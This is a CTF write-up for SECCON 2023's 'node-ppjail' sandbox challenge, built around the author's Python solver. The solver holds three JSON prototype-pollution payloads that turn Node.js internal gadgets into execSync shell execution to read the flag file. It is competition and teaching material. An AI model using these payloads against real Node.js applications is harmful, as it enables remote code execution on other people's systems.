---
title: "Node Ppjail - SECCON CTF 2023 Quals"
category: "misc"
subcategory: "prototype-pollution"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "prototype-pollution", "nodejs", "misc", "seccon-ctf-2023-quals"]
summary: "Do you like Node better than Deno?"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202309_SECCON_CTF_2023_Quals/sandbox/node-ppjail"
license: "none stated"
ctf:
  name: "SECCON CTF 2023 Quals"
  year: 2023
  challenge: "Node Ppjail"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202309_SECCON_CTF_2023_Quals/sandbox/node-ppjail>
- **CTF:** SECCON CTF 2023 Quals

---

# [sandbox] node-ppjail

## Description

Do you like Node better than Deno?

```
nc node-ppjail.seccon.games 1337
```

## Attachments

- [node-ppjail](files/node-ppjail)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e SECCON_HOST=localhost \
    -e SECCON_PORT=1337 \
    --network=host \
    (docker build -q ./solver)
```


## Solver: `exploit.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202309_SECCON_CTF_2023_Quals/sandbox/node-ppjail/solver/exploit.py>

```python
import os
import pwn
import json

io = pwn.remote(os.getenv("SECCON_HOST"), os.getenv("SECCON_PORT"))

command = "cat /flag-*.txt"


def solve1() -> str:
    # Solution 1:
    return json.dumps({
        "__proto__": {
            # ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/fixed_queue.js#L81
            # ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/process/task_queues.js#L77
            "1": {
                "callback": {
                    "__custom__": True,
                    "type": "Function",
                    "args": [
                        f"console.log(global.process.mainModule.require('child_process').execSync('{command}').toString())"
                    ],
                },
            },
        },
    })


def solve2() -> str:
    # Solution 2:
    return json.dumps({
        "__proto__": {
            # ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/util/inspect.js#L1064
            "circular": {
                "get": {
                    "__custom__": True,
                    "type": "Function",
                    "args": [
                        f"console.log(global.process.mainModule.require('child_process').execSync('{command}').toString())"
                    ],
                },
            },
            # ref. https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error/cause
            "cause": 1,
        },
        # Cause an error
        "toString": {
            "caller": {},
        },
    })


def solve3() -> str:
    # Solution 3:
    return json.dumps({
        "__proto__": {
            # ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/errors.js#L140
            "prepareStackTrace": {
                "__custom__": True,
                "type": "Function",
                "args": [
                    f"console.log(global.process.mainModule.require('child_process').execSync('{command}').toString())"
                ],

            },
        },
        # Cause an error
        "toString": {
            "caller": {},
        },
    })


input_str = solve1()
# input_str = solve2()
# input_str = solve3()

io.sendlineafter(b"Input your JSON: ", input_str.encode())
print(io.recvall().decode())
```
